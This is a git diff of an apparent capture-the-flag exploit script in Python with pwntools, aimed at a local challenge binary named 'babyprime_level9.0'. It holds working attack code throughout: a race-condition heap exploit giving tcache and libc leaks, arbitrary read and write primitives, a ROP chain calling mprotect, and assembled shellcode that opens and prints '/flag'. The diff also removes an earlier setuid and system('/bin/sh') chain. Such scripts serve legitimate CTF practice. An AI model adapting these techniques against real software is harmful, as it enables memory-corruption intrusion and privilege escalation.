@@ -2,9 +2,6 @@ import time
 from pwn import *
 import os
 
-
-
-
 idx = 2
 
 	
@@ -52,7 +49,7 @@ def controlled_allocations(r1, r2, addr, heap_base_addr):
 	r1.sendline(f"free {idx + 1}".encode()) # free B
 	
 	while True:
-#		print("Running Arbitrary Read on Address: ", hex(addr))
+		#print("Running Arbitrary Read on Address: ", hex(addr))
 		if os.fork() == 0:
 			r1.sendline(f"free {idx}".encode()) # free A
 			os.kill(os.getpid(), 9)
@@ -91,60 +88,135 @@ def arbitrary_write(r1, r2, addr, heap_base_addr, content):
 	controlled_allocations(r1, r2, addr, heap_base_addr)
 	r1.sendline(f"scanf {idx - 1}".encode())
 	r1.sendline(content)
-
+	
 	
 def exploit(r1, r2, p):
-
+	s = '''
+	b * challenge+1354
+	'''
+	global offset1
+	global offset2
+	global offset3
+	global offset4
 	
 	leak = leak_tcache(r1, r2)
+	
 	if leak:
-		heap_base = leak
-		print("tcache next pointer: ", hex(heap_base))
+		gdb.attach(p, s)
+		r2.interactive()
+		print("tcache next pointer: ", hex(leak))
 		
+		# pivoting around memory, so we need to leak many times
 		location1 = (leak << 12) + 0x8a0
-		#print(f"\nGDB: gdb -p {p.pid}")
-		#pause()
-		libc_leak = arbitrary_read(r1, r2, location1, heap_base)
-		print("libc leak: ", hex(libc_leak))
+		libc_leak = arbitrary_read(r1, r2, location1, leak)
+		print("libc leak leak: ", hex(libc_leak))
+
+
+		location2 = libc_leak + 0x60	
+		leak3 = arbitrary_read(r1, r2, location2, leak + 1) # pivot 
+
+		
+		location3 = leak3 - 0x100
+		stack_leak = arbitrary_read(r1, r2, location3, leak + 1)
+		print("stack_leak: ", hex(stack_leak))
+	
+		
+		rbp_addr = stack_leak - 0x810
 		libc_base = libc_leak - 0x219c80
-
-		location2 = libc_leak + 0x8b0
-		print("location2: ", hex(location2))
-		print(f"\nGDB: gdb -p {p.pid}")
-		pause()	
-		stack_leak = arbitrary_read(r1, r2, location2, heap_base + 1)
-		print("stack leak: ", hex(stack_leak))
-		rbp_addr = stack_leak - 0x2392 # write from rbp (ending with 0 nibble)
-		print("rip location: ", hex(rbp_addr))
-
 		
 		# gadgets
 		binsh_addr = libc_base + 0x1d8698
 		setuid = libc_base + 0xec0d0
 		system = libc_base + 0x50d70
 		pop_rdi = libc_base + 0x000000000002a3e5
+		pop_rsi = libc_base + 0x000000000002be51
+		pop_rdx = libc_base + 0x00000000000796a2
+		execve = libc_base + 0xeb080
 		
-		payload = p64(0) # rbp
-		payload += p64(pop_rdi) # rip
-		payload += p64(0)
-		payload += p64(setuid)
-		payload += p64(pop_rdi)
-		payload += p64(binsh_addr)
-		payload += p64(system)
+		libc = p.elf.libc
 		
-		print(f"\nGDB: gdb -p {p.pid}")
-		pause()
+		context.arch = 'amd64'
 		
-		arbitrary_write(r1, r2, rbp_addr, heap_base, payload)
+		print("!!!!! MPROTECT + SHELLCODE !!!!!!")
 		
-		r1.clean()
-		r2.clean()
-		r1.sendline(b"ls")
-		r2.sendline(b"ls")
-		response = r1.recvall(timeout=2)
-		response2 = r2.recvall(timeout=2)
-		print(response)
-		print(response2)
+		shellcode = asm('''
+		    /* Open the file */
+		    push 257
+		    pop rax
+		    mov rdi, -100       /* dirfd: AT_FDCWD */
+		    lea rsi, [rip+flag] /* pointer to "CDr46w9anrq3vg0Z" */
+		    xor edx, edx        /* flags: O_RDONLY */
+		    syscall
+
+		    /* Read and write in one step */
+		    push rax
+		    pop rdi
+		    xor eax, eax        /* syscall: read */
+		    sub rsp, 64         /* smaller buffer */
+		    mov rsi, rsp        /* buffer address */
+		    mov rdx, 64         /* buffer size */
+		    syscall
+		    
+		    /* Write to stdout */
+		    push rax
+		    pop rdx
+		    mov rax, 1          /* syscall: write */
+		    mov rdi, 1          /* fd: stdout */
+		    /* rsi already points to our buffer */
+		    syscall
+
+		flag:
+		    .string "/flag" 
+
+		''')
+		
+		mprotect_addr = libc_base + libc.symbols['mprotect']
+		shellcode_addr = (leak << 12) + 0x1000
+
+		# mprotect(shellcode_addr, 0x1000, 7)
+		rop_chain = b""
+		rop_chain += p64(pop_rdi)           
+		rop_chain += p64(shellcode_addr)    
+		rop_chain += p64(pop_rsi)            
+		rop_chain += p64(0x1000)            
+		rop_chain += p64(pop_rdx)           
+		rop_chain += p64(7)                 # PROT_READ|PROT_WRITE|PROT_EXEC
+		rop_chain += p64(mprotect_addr)     
+
+		payload = p64(0) + rop_chain + p64(shellcode_addr) # jump to our shellcode
+
+		badchars = b"\x09\x0a\x0b\x0c\x0d\x0e\x20"
+
+		print(f"Checking bad chars (whitespaces)")
+		if any(bad in shellcode for bad in badchars):
+			print("WARNING: Shellcode contains bad characters!")
+			print(f"Shellcode hex: {shellcode.hex()}")
+			
+		if any(bad in payload for bad in badchars):
+			print("WARNING: ROP payload contains bad characters!")
+			print(f"Payload hex: {payload.hex()}")
+		
+		# pre-write shellcode to heap
+		arbitrary_write(r1, r2, (leak << 12) + 0x1000, leak + 2, shellcode)
+		# overwrite rip to hijack control flow and call mprotect as well as jumping to shellcode
+		arbitrary_write(r1, r2, rbp_addr, leak + 2, payload)
+
+		#gdb.attach(p, s)
+		
+		try:
+			r1.clean()
+			r2.clean()
+			p.clean()
+			r2.sendline("quit")
+			
+			#r2.sendline("ls")
+			#r2.interactive()
+			
+			#p.interactive()
+			response = p.recvall(timeout=2)
+			print(response)
+		except Exception as e:
+			print(f"Final command execution failed: {e}")	
 		
 		return True
 	else:
@@ -161,10 +233,10 @@ def main():
 		idx = 2
 		
 		try: # code that might fail 
-			binary = './babyprime_level3.0_patched'
+			binary = './babyprime_level9.0'
 			p = process(binary)
-			r1 = remote("localhost", 1337)
-			r2 = remote("localhost", 1337)
+			r1 = remote("localhost", 1337, timeout = 1)
+			r2 = remote("localhost", 1337, timeout = 1)
 
 			if exploit(r1, r2, p):
 				break 
@@ -172,10 +244,9 @@ def main():
 			print(f"Error in attempt {attempt + 1}: {e}")
 		finally: # code that always run no matter what
 			try:
-				pass
-				#r1.close()
-				#r2.close()
-				#p.kill()
+				r1.close()
+				r2.close()
+				p.kill()
 			except:
 				pass
 		attempt += 1
